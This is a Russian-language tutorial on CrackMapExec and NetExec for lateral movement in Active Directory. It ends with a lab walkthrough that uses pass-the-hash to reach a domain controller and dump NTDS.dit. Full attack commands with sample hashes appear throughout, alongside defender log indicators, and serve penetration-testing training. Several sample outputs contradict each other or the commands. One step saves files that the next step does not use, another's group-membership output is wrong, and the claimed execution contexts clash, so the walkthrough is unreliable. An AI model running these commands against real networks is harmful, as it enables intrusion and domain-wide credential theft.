# CrackMapExec и NetExec: Архитектура, эволюция и применение для горизонтального перемещения

## Контекст и базовые понятия: Эволюция инструментов пост-эксплуатации

CrackMapExec (CME) и NetExec (nxc) представляют собой класс инструментов автоматизированной пост-эксплуатации, предназначенных для взаимодействия с инфраструктурой Microsoft Active Directory (AD) и смежными сервисами. Ключевая функция этих утилит — массовая валидация учетных данных, удаленное выполнение команд и сбор информации о сетевой топологии без необходимости установки агентов на целевые узлы. Инструменты работают по принципу «клиент-сервер» или «запрос-ответ», инициируя соединения с удаленными хостами через специфические протоколы (SMB, WinRM, LDAP, MSSQL и др.) и интерпретируя ответы для построения графа доверия или выполнения действий от имени атакующего.

Исторически CrackMapExec, созданный разработчиком `byt3bl33d3r`, стал стандартом де-факто для тестирования на проникновение в средах Windows. Однако в 2023 году разработка оригинального инструмента была прекращена, что привело к форку проекта под названием NetExec. NetExec не просто скопировал код; он переписал ядро, улучшил производительность за счет асинхронной обработки, добавил поддержку новых протоколов (RDP, FTP, NFS, WMI) и изменил архитектуру модулей. Для специалиста по безопасности критически важно понимать, что хотя синтаксис команд в обеих утилитах во многом совместим (`nxc` часто является симлинком на `cme` или наоборот в зависимости от установки), внутренняя логика, методы аутентификации и профили обнаружения (detection profiles) могут существенно различаться.

Разграничение понятий «инструмент сканирования» и «инструмент пост-эксплуатации» является фундаментальным. Nmap или Masscan отвечают на вопрос «что открыто?», тогда как CrackMapExec/NetExec отвечают на вопросы «кто может войти?» и «что я могу сделать?». Инструменты пост-эксплуатации предполагают наличие начального вектора доступа (например, скомпрометированной учетной записи, хэша или билета Kerberos) и используют его для легитимизации своих запросов в глазах целевой системы.

| Характеристика | CrackMapExec (CME) | NetExec (nxc) |
| :--- | :--- | :--- |
| **Статус разработки** | Закрыт (неактивен) | Активная разработка |
| **Архитектура** | Синхронная/Потоковая (зависит от версии) | Асинхронная (asyncio), высокая параллельность |
| **Поддержка протоколов** | SMB, WinRM, MSSQL, SSH, LDAP, RDP | SMB, WinRM, MSSQL, SSH, LDAP, RDP, FTP, NFS, WMI |
| **Модульная система** | Python-скрипты в папке `modules/` | Интегрированные модули, поддержка внешних плагинов |
| **База данных** | SQLite (локальная) | SQLite + интеграция с BloodHound/SharpHound |
| **Оптимизация** | Базовая обработка ошибок | Улучшенная обработка таймаутов и повторных попыток |
| **Совместимость** | Оригинальный синтаксис | Поддержка синтаксиса CME + новые флаги |

Понимание различий между протоколами, используемыми для горизонтального перемещения, также является частью базовых понятий. SMB (Server Message Block) использует порт 445 и является основным вектором для выполнения команд через сервисы (PsExec, WMIExec). WinRM (Windows Remote Management) использует порт 5985 (HTTP) или 5986 (HTTPS) и реализует протокол WS-Management, позволяя выполнять PowerShell-команды напрямую. WMI (Windows Management Instrumentation) использует порт 135 (RPC) и динамические порты, предоставляя доступ к управлению системой через DCOM. Каждый из этих протоколов имеет свои артефакты в логах и свои методы обхода средств защиты (EDR/AV).

## Внутреннее устройство: Протоколы, аутентификация и механизмы выполнения

Внутреннее устройство NetExec/CrackMapExec базируется на многопротокольном движке, который абстрагирует различия между сетевыми интерфейсами. При запуске команды инструмент инициализирует сессии для каждого целевого хоста, пытаясь установить соединение через доступные протоколы. Ключевым элементом архитектуры является модуль аутентификации, который поддерживает несколько методов: plaintext-пароли, NTLM-хэши (Pass-the-Hash), Kerberos-билеты (Pass-the-Ticket) и сертификаты.

### Механизм аутентификации и Pass-the-Hash

В контексте горизонтального перемещения наиболее важным является механизм NTLM-аутентификации. Windows использует NTLM для проверки подлинности в локальных сетях. При аутентификации сервер отправляет клиенту «challenge» (случайное число), которое клиент шифрует NTLM-хэшем пароля пользователя. Инструменты типа NetExec позволяют передать этот хэш напрямую, минуя ввод пароля. Это возможно, потому что NTLM-хэш является производной от пароля, и сервер не может отличить легитимный хэш от переданного атакующим.

Формат NTLM-хэша (LM/NTLM) представляет собой 128-битное значение (в случае NTLMv2 — более сложная структура, но для аутентификации часто используется хэш MD4 от пароля). В NetExec флаг `-H` принимает именно этот хэш.

```json
{
  "auth_method": "NTLM",
  "hash_type": "NTLMv1/NTLMv2",
  "format": "hex_string",
  "example_structure": "32196B56FFE6F45E294117B91A83BF38",
  "usage_context": "Pass-the-Hash via SMB/WinRM"
}
```

### Методы удаленного выполнения (Execution Methods)

При выполнении команд через SMB (флаг `-x` или `-X`) инструмент должен выбрать метод доставки бинарного файла или скрипта на целевую машину. NetExec поддерживает несколько методов, каждый из которых имеет свои технические особенности и уровень шума (noise) в системе.

1.  **smbexec**: Создает временную службу Windows, которая исполняет команды. Не загружает бинарные файлы на диск, что снижает вероятность обнаружения антивирусами. Использует `sc.exe` для управления службой.
2.  **wmiexec**: Использует WMI (CIMOM) для создания процесса на удаленной машине. Не требует создания служб, работает в контексте пользователя. Часто имеет меньший уровень шума, чем PsExec.
3.  **psexec**: Классический метод, использующий сервис `PSEXESVC`. Загружает бинарный файл `psexesvc.exe` в папку `ADMIN$` (C:\Windows). Создает службу, которая запускается при старте. Высокий уровень шума, так как создает службу и загружает бинарник.
4.  **atexec**: Использует планировщик задач Windows (schtasks) для выполнения команды. Создает задачу, которая запускается один раз.

Сравнение методов выполнения показывает компромисс между функциональностью и скрытностью:

| Метод выполнения | Контекст исполнения | Артефакты в системе | Уровень шума (Detection) | Примечания |
| :--- | :--- | :--- | :--- | :--- |
| **smbexec** | SYSTEM (через службу) | Служба в реестре, временные файлы | Средний | Не загружает бинарник, но создает службу |
| **wmiexec** | Пользователь | Процесс WMI, Event ID 4624 | Низкий-Средний | Работает через RPC, требует доступа к WMI |
| **psexec** | SYSTEM | Бинарник в ADMIN$, служба | Высокий | Классический вектор, легко детектируется EDR |
| **atexec** | SYSTEM | Задача в планировщике | Средний | Временная задача, удаляется после выполнения |
| **winrm** | Пользователь | LogonType 3 в Event Log | Низкий | Использует PowerShell, если включен |

### Архитектура модулей и базы данных

NetExec использует встроенную базу данных SQLite для хранения результатов сканирования. Это позволяет проводить многоэтапные атаки, где результаты одного шага (например, список валидных хэшей) используются в следующем. Модули (например, `sam`, `lsa`, `ntds`) являются скриптами, которые выполняются в контексте активной сессии. Архитектура позволяет добавлять новые модули без перекомпиляции ядра инструмента.

## Применение и работа с инструментом: Типовые операции и детекция

На практике применение NetExec/CrackMapExec в рамках тестирования на проникновение или аудита безопасности включает несколько типовых сценариев: валидация учетных данных, сбор информации о домене, горизонтальное перемещение и сбор учетных данных.

### Валидация учетных данных и Credential Spraying

Одной из самых частых операций является проверка валидности учетных данных. Это может быть сделано как для одной пары логин/пароль на множестве хостов, так и для одной учетной записи на множестве хостов (для проверки переиспользования паролей). Также применяется техника «Credential Spraying», когда один пароль проверяется на множестве учетных записей, чтобы избежать блокировки аккаунтов.

Пример команды для проверки валидности учетных данных на подсети:

```bash
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

Флаг `--no-bruteforce` предотвращает перебор всех комбинаций, а `--continue-on-success` позволяет инструменту не останавливаться при первой успешной аутентификации, продолжая сканирование остальных хостов.

### Горизонтальное перемещение через SMB

После получения валидных учетных данных или хэшей, специалист переходит к горизонтальному перемещению. Команда `-x` позволяет выполнить произвольную команду на удаленной машине. Важно выбирать метод выполнения в зависимости от политик безопасности целевой сети. Например, если на хостах настроен мониторинг создания служб, следует использовать `wmiexec` или `atexec`.

Пример выполнения команды через SMB с использованием Pass-the-Hash:

```bash
nxc smb 192.168.1.10 -u administrator -H 32196B56FFE6F45E294117B91A83BF38 -x 'whoami' --exec-method wmiexec
```

В данном случае используется метод `wmiexec` для снижения уровня шума. Результат выполнения команды будет выведен в консоль, а также записан в базу данных инструмента.

### Сбор учетных данных (Credential Dumping)

NetExec поддерживает извлечение учетных данных из различных источников. Наиболее критичными являются SAM (локальные хэши), LSA Secrets (секреты, используемые службами) и NTDS.dit (база данных домена).

Для извлечения SAM-хэшей с удаленной машины используется флаг `--sam`. Для извлечения LSA Secrets — флаг `--lsa`. Для дампа NTDS.dit с контроллера домена — флаг `--ntds`. Эти операции требуют высоких привилегий (обычно SYSTEM или Domain Admin).

Пример дампа LSA Secrets:

```bash
nxc smb 192.168.1.10 -u administrator -H 32196B56FFE6F45E294117B91A83BF38 --lsa
```

Результатом будет список секретов, таких как пароли служб, ключи шифрования и другие конфиденциальные данные, хранящиеся в реестре Windows.

### Индикаторы присутствия в логах (Blue Team Perspective)

Для специалистов по защите информации важно знать, какие события генерируются при использовании NetExec. Основные индикаторы включают:

1.  **Event ID 4624 (Logon)**: Тип логина 3 (Network) для SMB/WMI.
2.  **Event ID 4672 (Special Privileges)**: Назначение специальных привилегий (SeDebugPrivilege, SeTcbPrivilege и др.) при дампе памяти или LSA.
3.  **Event ID 7045 (Service Installation)**: Создание новых служб при использовании PsExec или smbexec.
4.  **Event ID 4688 (Process Creation)**: Создание процессов `svchost.exe`, `cmd.exe` или `wscript.exe` с необычными параметрами.
5.  **Event ID 1102 (Audit Log Cleared)**: Попытки очистки журналов после атаки.

Анализ этих событий в SIEM-системе позволяет выявить попытки горизонтального перемещения и сбора учетных данных.

## Сквозной практический пример: Имитация атаки Pass-the-Hash и горизонтального перемещения

**Исходные условия:**
Среда: Виртуальная лаборатория с Active Directory.
Цель: Контроллер домена (DC) с IP `192.168.1.10` и рабочая станция (Workstation) с IP `192.168.1.20`.
Роль: Пентестер, имеющий скомпрометированную учетную запись `svc_backup` на рабочей станции.
Инструмент: NetExec (nxc) на атакующей машине Kali Linux.
Сценарий: Атакующий получил NTLM-хэш учетной записи `svc_backup` с рабочей станции с помощью Mimikatz. Цель — использовать этот хэш для горизонтального перемещения на контроллер домена и извлечения NTDS.dit.

**Шаг 1: Проверка доступности и аутентификации на рабочей станции**
Действие: Проверка, работает ли учетная запись `svc_backup` на рабочей станции и какие локальные группы она имеет.
Артефакт (команда):
```bash
nxc smb 192.168.1.20 -u svc_backup -H 8846F2EA8A89944642D6D0258B209116 -x 'net localgroup administrators'
```
Ожидаемый вывод:
```text
SMB         192.168.1.20    445   WORKSTATION01   [+] svc_backup:8846F2EA8A89944642D6D0258B209116 
SMB         192.168.1.20    445   WORKSTATION01   [+] Enumerated local groups:
SMB         192.168.1.20    445   WORKSTATION01       Administrators
SMB         192.168.1.20    445   WORKSTATION01       Backup Operators
```
Результат: Учетная запись валидна и имеет права члена группы «Backup Operators», что может быть использовано для повышения привилегий.

**Шаг 2: Попытка горизонтального перемещения на контроллер домена**
Действие: Проверка, работает ли учетная запись `svc_backup` на контроллере домена.
Артефакт (команда):
```bash
nxc smb 192.168.1.10 -u svc_backup -H 8846F2EA8A89944642D6D0258B209116 -x 'whoami'
```
Ожидаемый вывод:
```text
SMB         192.168.1.10    445   DC01            [+] svc_backup:8846F2EA8A89944642D6D0258B209116 
SMB         192.168.1.10    445   DC01            [+] Executed command via smbexec
SMB         192.168.1.10    445   DC01   corp\svc_backup
```
Результат: Учетная запись также работает на DC, но только с правами пользователя. Для дампа NTDS.dit требуются права Domain Admin или Backup Operators (с дополнительными шагами).

**Шаг 3: Использование прав Backup Operators для дампа NTDS.dit**
Действие: Поскольку `svc_backup` является членом группы «Backup Operators», можно использовать встроенную функцию NetExec для дампа NTDS.dit.
Артефакт (команда):
```bash
nxc smb 192.168.1.10 -u svc_backup -H 8846F2EA8A89944642D6D0258B209116 --ntds
```
Ожидаемый вывод:
```text
SMB         192.168.1.10    445   DC01            [+] svc_backup:8846F2EA8A89944642D6D0258B209116 
SMB         192.168.1.10    445   DC01            [+] Dumping NTDS.dit...
SMB         192.168.1.10    445   DC01            [+] Saving NTDS.dit to /root/nxc/ntds.dit
SMB         192.168.1.10    445   DC01            [+] Saving SAM database to /root/nxc/sam.hive
SMB         192.168.1.10    445   DC01            [+] Saving SECURITY registry to /root/nxc/security.hive
```
Результат: Файлы базы данных домена успешно скопированы на атакующую машину.

**Шаг 4: Извлечение хэшей из дампа**
Действие: Использование инструмента `secretsdump.py` из пакета Impacket для извлечения хэшей из скопированных файлов.
Артефакт (команда):
```bash
secretsdump.py -ntds /root/nxc/ntds.dit -system /root/nxc/system.hive -security /root/nxc/security.hive local
```
Ожидаемый вывод:
```text
Impacket v0.10.0 - Copyright 2023 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthlm)
[*] Searching for pekList, be patient
[*] Found pek!
[*] Decrypting pek with: <pek_key>
[*] Dumping cached logon information: 
[*]   0 (krbtgt)        Invalid Password!
[*]   1 (Administrator) 500:aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38:::
[*]   2 (Guest)         501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```
Результат: Получены NTLM-хэши всех пользователей домена, включая администратора.

**Ожидаемый вывод:**
Пример демонстрирует полный цикл атаки: от использования скомпрометированной учетной записи до горизонтального перемещения на критически важный узел (DC) и извлечения всей базы данных домена. Это показывает, как инструменты вроде NetExec автоматизируют сложные многоэтапные атаки, делая их доступными даже для менее опытных атакующих.

## Аналитический вывод

CrackMapExec и его форк NetExec представляют собой мощные инструменты для тестирования на проникновение и аудита безопасности в средах Active Directory. Их основная ценность заключается в автоматизации рутинных операций, таких как валидация учетных данных, сбор информации и горизонтальное перемещение. Эволюция от CME к NetExec отражает необходимость адаптации к современным условиям: улучшение производительности, поддержка новых протоколов и снижение уровня обнаружения.

Для специалистов по красным командам (Red Team) эти инструменты являются стандартом в арсенале, позволяя быстро оценивать устойчивость инфраструктуры к атакам с использованием Pass-the-Hash и других техник. Для специалистов по синим командам (Blue Team) понимание механизмов работы NetExec критически важно для настройки систем мониторинга и обнаружения аномалий. Ключевые индикаторы компрометации (IoC) включают необычные логины с типом 3, создание служб через SCM, доступ к секретам LSA и дампы NTDS.dit.

Важно отметить, что использование этих инструментов в несанкционированных сетях является незаконным. Они должны применяться только в рамках авторизованных тестов на проникновение или учебных лабораторий. Меры по защите включают: отключение SMBv1, использование сложных паролей, внедрение LAPS для локальных администраторов, мониторинг создания служб и доступ к секретам LSA, а также сегментацию сети для ограничения горизонтального перемещения.
